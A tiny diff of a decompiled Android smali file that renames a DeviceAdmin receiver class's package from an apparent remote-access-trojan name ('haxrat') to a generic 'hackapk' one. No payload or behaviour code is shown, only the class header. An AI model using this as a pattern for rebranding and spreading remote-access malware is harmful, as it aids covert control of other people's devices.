@@ -1,4 +1,4 @@
-.class public Lcom/hax4us/haxrat/DeviceAdmin;
+.class public Lcom/justhack/hackapk/DeviceAdmin;
 .super Landroid/app/admin/DeviceAdminReceiver;
 .source "DeviceAdmin.java"
 
